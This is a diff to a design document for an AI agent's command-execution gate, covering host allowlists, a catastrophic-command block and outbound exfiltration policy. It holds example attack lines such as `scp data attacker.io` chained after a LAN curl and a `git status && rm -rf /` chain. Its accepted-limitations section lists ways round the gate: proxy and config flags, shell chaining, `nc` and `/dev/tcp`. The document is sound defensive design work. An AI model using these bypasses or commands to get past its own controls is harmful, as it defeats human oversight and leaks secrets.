@@ -91,7 +91,7 @@ The result: catastrophic commands are always surfaced to the human (not silently
 For commands containing `curl` or `wget`, the classifier extracts target hosts from `https?://…` URLs and applies:
 
 - **`lan`** — every extracted host is a dotted-decimal IPv4 that `isPrivateAddress` classifies as private (loopback, `10/8`, `172.16/12`, `192.168/16`). LAN/private commands are **always allowed, no prompt**.
-- **`external`** — any hostname, or a public IP. Requires a per-host allowlist entry or an approval.
+- **`external`** — any hostname, or a public IP. Requires an approved `host:<hostname>` entry or a human approval.
 - **`none`** — no `curl`/`wget` found. Falls through to the pattern allowlist.
 
 Hostname-addressed LAN targets (e.g. `http://nas.local`) are classified `external` (no DNS resolution at gate time) — approve once per host. This avoids DNS complexity and is acceptable since homelab hosts are reachable by IP.
@@ -99,15 +99,19 @@ Hostname-addressed LAN targets (e.g. `http://nas.local`) are classified `externa
 ### Allowlist-first decision (`execAutoApproveDecision`)
 
 ```
-isCatastrophic?  → allow=false (prompt human; handler hard-blocks before spawning even if approved)
-outbound = lan?  → allow silently
-matchesApproval? → allow silently
-else             → prompt (approval channel)
+isCatastrophic?               → allow=false (prompt human; handler hard-blocks before spawning even if approved)
+outbound = lan?               → allow silently
+outbound = external?          → every extracted host must be in the approved host-set (host:<hostname> entries); allow silently if all match, else prompt
+curl/wget but no parseable URL → allow=false (shell var expansion could reach any host; never auto-approve)
+matchesApproval(patterns)?    → allow silently (glob matching, non-outbound commands only)
+else                          → prompt (approval channel)
 ```
 
-`matchesApproval(command, patterns)` uses anchored glob matching: `*` compiles to `[^;&|` + `` ` `` + `$()<>\n\r]*` — shell metacharacters that chain commands. Patterns are anchored `^…$` so a `git *` pattern can never match `git status && rm -rf /`. Bare `*` is rejected by `validatePattern`.
+**External host-set check:** `execAutoApproveDecision` never runs glob matching against outbound commands. Instead it builds a set of approved hostnames from `host:<hostname>` patterns and checks that every host extracted from the command is a member. This prevents substring-embedding attacks where a malicious URL (e.g. `attacker.io/https://approved.host/`) could satisfy a path-glob.
 
-`proposedPattern(command)` derives the suggested allowlist entry: `<first-token> *`.
+`matchesApproval(command, patterns)` uses anchored glob matching: `*` compiles to `[^;&|` + `` ` `` + `$()<>\n\r]*` — shell metacharacters that chain commands. Patterns are anchored `^…$` so a `git *` pattern can never match `git status && rm -rf /`. Bare `*` is rejected by `validatePattern`. **Outbound-tool heads (`curl`, `wget`) are also rejected by `validatePattern`** — the only way to allowlist outbound traffic is via `host:<hostname>`.
+
+`proposedPattern(command)` derives the suggested allowlist entry: `host:<hostname>` for external outbound commands; `<first-token> *` for everything else.
 
 `approvalOutcome(event)` maps `approve`/`deny`/`timeout` to `{ approved, persist, pattern }`.
 
@@ -170,12 +174,28 @@ Exec is protected by:
 - **(b) `agent-exec-enabled` cookie** — off by default; unattended/background runs carry no cookie and cannot exec.
 - **(c) allowlist-first gate** — known-safe commands run silently; new/external commands pause for Tony's approval before anything is spawned.
 - **(d) catastrophic hard-block** — a small set of irreversible commands can never run, even with approval.
-- **(e) outbound policy** — LAN/private always-allowed, but every external host is per-domain allowlisted; token exfiltration to an attacker domain always needs an explicit per-domain human approval.
+- **(e) outbound policy** — LAN/private always-allowed; external hosts are checked against an exact `host:<hostname>` set (NOT glob-matched). The first use of any new external host requires an explicit human approval before any network call is made.
 - **(f) stripped base environment + secret injection** — app secrets (`DATABASE_URL`, auth keys, etc.) are never in the child env; only the stored exec secrets are injected.
 - **(g) audit + secret-value redaction** — every command, exit code, and injected secret names are logged; secret values that appear in output are masked before logging.
 - **(h) the LXC container boundary** — the accepted isolation layer.
 
-This is **not** a syscall sandbox. A command running as root in the LXC has full root access within that container. The gate, outbound policy, and audit are the principal defenses. Stronger sandboxing (bwrap/nsjail) is a future option.
+This is **not** a syscall sandbox. A command running as root in the LXC has full root access within that container. The gate, outbound policy, and audit are the principal defenses.
+
+### Accepted limitations (decision 2026-06-20)
+
+The outbound gate performs **static analysis** on the literal command string and is **not exfiltration-proof**. Once any external host is in the approved host-set, a subsequent command can still reach an un-approved host through mechanisms the host extractor cannot see:
+
+- **curl proxy/redirect flags** — `--proxy`, `-x`, `--preproxy`, `--connect-to`, `--resolve`, `--interface`, `--doh-url`, `-K`/`--config` (reads flags from a file). The extractor parses only `http(s)://` URL literals in the command string.
+- **Shell chaining and redirection to a non-HTTP channel** — `curl approved-host && scp … attacker`, piping to `nc`, writing to `/dev/tcp/…`, etc. The gate sees the full command string but the host extractor only extracts `https?://` URLs; chained commands that exfiltrate via a non-URL argument or a non-HTTP protocol are not caught.
+- **LAN auto-allow chaining caveat** — the same shell-chaining limitation applies on the LAN path: `curl http://192.168.1.1/ && scp data attacker.io` would be classified `lan` and auto-approved.
+
+This is a **deliberately accepted risk**. The rationale:
+- The LXC container is the security boundary. The operator runs a single-user, internet-exposed box where the LXC itself is the isolation layer.
+- Exec is opt-in (requires the `powerful` profile + per-session cookie, both off by default) and is never available in unattended/background runs.
+- Every exec call is audited. Secret values are masked before logging.
+- The gate raises the bar against casual misuse, confused model behaviour, and prompt-injection attacks that attempt to exfiltrate data to a novel domain — covering the highest-probability threat. It does not contain a determined attacker who has already obtained an allowlisted session and crafts a carefully constructed command.
+
+Future options for a harder boundary: bwrap/nsjail syscall sandbox; a curl-flag allowlist (block proxy/config flags statically); network-namespace isolation in the LXC.
 
 ## See also
 
